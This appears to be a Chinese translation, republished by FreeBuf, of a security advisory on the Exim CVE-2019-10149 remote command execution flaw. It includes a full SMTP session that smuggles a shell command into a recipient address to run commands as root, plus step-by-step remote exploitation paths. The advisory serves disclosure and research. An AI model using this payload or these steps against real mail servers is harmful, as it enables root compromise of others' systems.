@@ -1,0 +1,230 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+## 0x00 概述  
+
+**在对Exim邮件服务器最新版本变化进行代码审计时(<https://en.wikipedia.org/wiki/Exim>)，我们发现了一个RCE漏洞，其影响版本为4.87-4.91。但是在这个RCE漏洞中，RCE指的是远程命令（Command）执行，并不是传统意义上的远程代码（Code）执行。攻击者可以用root用户身份通过execv（）函数进行远程命令执行操作。**
+
+攻击者利用该漏洞在服务端本地发起攻击或者在非默认配置下发起攻击时并没有什么其他的限制条件，如果攻击者远程利用该漏洞，攻击者必须和服务器保持7天的连接（每过几分钟需要向服务端传送1字节数据）。因为Exim的代码复杂，也有可能存在其他的攻击方式或者更简单更快速的攻击方式。
+
+Exim该漏洞从4.87（2016.4.6）版本出现，因为其配置中#ifdef EXPERIMENTAL_EVENT改成了#ifndef
+DISABLE_EVENT。老版本中如果手动更改了EXPERIMENTAL_EVENT属性为enable同样可以触发漏洞。该漏洞在4.92版本得到了修复。
+
+## 0x01 本地漏洞复现
+
+漏洞产生位置在deliver_message()函数：
+
+    
+    
+    if (process_recipients != RECIP_ACCEPT){
+    
+    		uschar * save_local =  deliver_localpart;
+    
+    		const uschar * save_domain = deliver_domain;
+    
+    		deliver_localpart=expand_string(string_sprintf("${local_part:%s}", new->address));
+    
+    		deliver_domain =expand_string(string_sprintf("${domain:%s}", new->address));
+    
+    		(void) event_raise(event_action,US"msg:fail:internal", new->message);
+    
+    		deliver_localpart = save_local;
+    
+    		deliver_domain =    save_domain;
+    
+    	}
+
+因为expand_string()函数可以识别"${run{<command><args>}}"格式的字符命令，new->address为邮件收件人地址，攻击者可以在本地发送邮件到"${run{...}}@localhost"，localhost为Exim的本地域，攻击者就可以以root用户权限执行命令，具体漏洞触发效果如下：
+
+    
+    
+    john@debian:~$ cat /tmp/id
+    
+    cat: /tmp/id: No such file or directory
+    
+    john@debian:~$ nc 127.0.0.1 25
+    
+    220 debian ESMTP Exim 4.89 Thu, 23 May 2019 09:10:41 -0400
+    
+    HELO localhost
+    
+    250 debian Hello localhost [127.0.0.1]
+    
+    MAIL FROM:<>
+    
+    250 OK
+    
+    RCPT TO:<${run{\x2Fbin\x2Fsh\t-c\t\x22id\x3E\x3E\x2Ftmp\x2Fid\x22}}@localhost>
+    
+    250 Accepted
+    
+    DATA
+    
+    354 Enter message, ending with "." on a line by itself
+    
+    Received: 1
+    
+    Received: 2
+    
+    Received: 3
+    
+    Received: 4
+    
+    Received: 5
+    
+    Received: 6
+    
+    Received: 7
+    
+    Received: 8
+    
+    Received: 9
+    
+    Received: 10
+    
+    Received: 11
+    
+    Received: 12
+    
+    Received: 13
+    
+    Received: 14
+    
+    Received: 15
+    
+    Received: 16
+    
+    Received: 17
+    
+    Received: 18
+    
+    Received: 19
+    
+    Received: 20
+    
+    Received: 21
+    
+    Received: 22
+    
+    Received: 23
+    
+    Received: 24
+    
+    Received: 25
+    
+    Received: 26
+    
+    Received: 27
+    
+    Received: 28
+    
+    Received: 29
+    
+    Received: 30
+    
+    Received: 31
+    
+    .
+    
+    250 OK id=1hTnYa-0000zp-8b
+    
+    QUIT
+    
+    221 debian closing connection
+    
+    john@debian:~$ cat /tmp/id
+    
+    cat: /tmp/id: Permission denied
+    
+    root@debian:~# cat /tmp/id
+    
+    uid=0(root) gid=111(Debian-exim) groups=111(Debian-exim)
+    
+    uid=0(root) gid=111(Debian-exim) groups=111(Debian-exim)
+
+在上面的触发漏洞示例中：
+
+1.向邮件服务器发送超过received_headers_max默认最大次数(30次)的"Received:"头部数据，导致服务器从将process_recipients设置为RECIP_FAIL_LOOP从而执行漏洞代码。
+
+2.在测试中我们绕过了收件人地址中的非法字符检测（blackslashes函数）。
+
+## 0x02 远程漏洞复现
+
+本地漏洞触发的方法无法用于远程执行，因为在Exim的准入控制列表中默认配置规定：收件人地址的本地部分（位于@符号前面的部分）应当是本地用户。
+
+    
+    
+    john@debian:~$ nc 192.168.56.101 25
+    
+    220 debian ESMTP Exim 4.89 Thu, 23 May 2019 10:06:37 -0400
+    
+    HELO localhost
+    
+    250 debian Hello localhost [192.168.56.101]
+    
+    MAIL FROM:<>
+    
+    250 OK
+    
+    RCPT TO:<${run{\x2Fbin\x2Fsh\t-c\t\x22id\x3E\x3E\x2Ftmp\x2Fid\x22}}@localhost>
+    
+    550 Unrouteable address
+
+我们最后找到了远程触发漏洞的方式，第一种方式是在服务器非默认配置的情况时，第二种是服务器处于默认配置情况下。第二种方式更复杂更难触发。
+
+###  非默认配置
+
+1.Administrator用户将ACL控制列表移除，本地触发漏洞的方式可以同样适用于远程漏洞触发。
+
+2.Exim配置中可以识别收件人地址中本地部分的标签（"local_part_suffix = +* : -*"
+），攻击者可以构造"balrog+${run{...}}@localhost"的收件人地址来触发漏洞（balrog为某一个本地用户）。
+
+3.如果Exim配置中要将邮件中继到远程域中，攻击者就可构造"${run{...}}@khazad.dum"的收件人地址来触发漏洞（khazad.dum为Exim配置中的远程域的域名），因为Exim服务器的控制列表只会检查远程的地址（@符号后面的部分），不会对本地部分进行检测。
+
+###  默认配置
+
+首先我们要利用"回弹"信息来解决ACL控制列表的用户认证问题。如果我们向邮件服务器发送的邮件无法送达到收件人，Exim会自动回弹一个发送失败信息到发件人。这样的话邮件发件人就变成了回弹信息的收件人，从而可以执行命令。因为ACL只会检查原始发件人的域部分地址，并不会检查本地部分。
+
+然后回弹信息必须要通过漏洞代码中的process_recipients !=
+RECIP_ACCEPT检查。因为我们不能够控制回弹信息的头部，所以无法重复发送超过30次。但是如果回弹信息7天后仍无法被成功发送，Exim会将process_recipients设置为RECIP_FAIL_TIMEOUT从而执行漏洞代码。
+
+最后需要解决的问题就是回弹信息会在2天后被服务器自动丢弃，除非回弹信息被推迟发送（触发临时发送失败策略），并且在4天后重发策略会将推迟发送地址变为失败发送地址，使得服务器在7天内放弃对回弹信息的丢弃操作，接下来是具体的操作方法：
+
+>
+> 1.我们向有漏洞的Exim服务器发送一封邮件地址不可达的邮件。邮件的收件人地址为"postmaster"，发件人地址为"${run{...}}@khazad.dum"，khazad.dum为我们自己可控的域。
+>
+> 2.因为邮件无法送达，Exim会连接到khazad.dum并且发送回弹信息，回弹信息的收件人为："${run{...}}@khazad.dum"。
+>
+> 3在接下来的7天内，我们需要每过4分钟向服务器发送1字节数据，从而保持与服务器的连接。
+>
+> 4.在7天之后服务器返回发送失败信息("550 Unrouteable
+> address")，回弹信息会自动交由post_process_one()处理。该功能会将回弹信息自动丢弃，但是回弹信息存在时间超过了两天后就不会被自动丢弃。
+    
+    
+    if (!*sender_address && message_age >= ignore_bounce_errors_after)
+    
+    		setflag(addr, af_ignore_error);
+
+在这里message_age并不是回弹信息的真实存在时长（超过7天），是该回弹信息加载到Exim服务器spool中的时长，可能只有几秒或者几分钟。
+
+5.最后Exim服务器会读取spool中的回弹信息，将process_recipients设置为RECIP_FAIL_TIMEOUT，此时message_age为回弹信息的真是存在时长，从而可以执行命令"${run{...}}@khazad.dum"。
+
+注意：在漏洞测试过程中可以修改Exim配置信息中timeout_frozen_after和ignore_bounce_errors的时长。
+
+## 0x03 致谢
+
+感谢Exim开发人员、Solar Designer和distros@openwall相关研发人员。
+
+以下为相关链接：
+
+<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0145>
+
+<https://seclists.org/bugtraq/1995/Feb/56>
+
+<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0095>
+
+<http://www.cheswick.com/ches/papers/berferd.pdf>
+
+原文地址：<https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt>  
+
+***本文作者：Kriston，转载请注明来自FreeBuf.COM**
+
